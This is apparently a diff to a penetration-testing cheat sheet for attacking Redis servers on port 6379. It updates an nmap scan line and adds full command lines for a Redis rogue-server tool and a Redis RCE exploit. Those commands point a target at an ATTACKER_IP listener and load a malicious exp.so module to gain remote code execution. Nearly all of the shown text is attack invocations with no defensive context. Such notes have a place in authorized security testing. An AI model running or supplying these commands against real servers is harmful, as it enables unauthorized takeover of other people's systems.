@@ -4,7 +4,7 @@ Port 6379
 
 ### 1) Nmap Scan
 
-    nmap -p 6379 --script "redis-info,redis-rce" IP
+    nmap -p 6379 --script "redis-info" IP
 
 ### 2) Brute force
 
@@ -16,13 +16,15 @@ Run a Redis rogue server to capture data or execute commands
 
 Link: https://github.com/n0b0dyCN/redis-rogue-server
 
-    python3 redis-rogue-server.py -p 6379
+    python3 redis-rogue-server.py --lhost=ATTACKER_IP --lport 6379 --rhost=TARGET_IP --rport 6379
 
-Run Redis RCE exploit using a custom script (replace 'payload' with the desired payload)
+OR
+
+Run Redis RCE exploit 
 
 Link: https://github.com/jas502n/Redis-RCE
 
-    python3 redis-rce-exploit.py -h IP -p 6379 -c "payload"
+    python3 redis-rce.py -r TARGET_IP -p 6379 -L ATTACKER_IP -P ATTACKER_PORT -f ../redis-rogue-server/exp.so -v
 
 ### 4) Connection
 
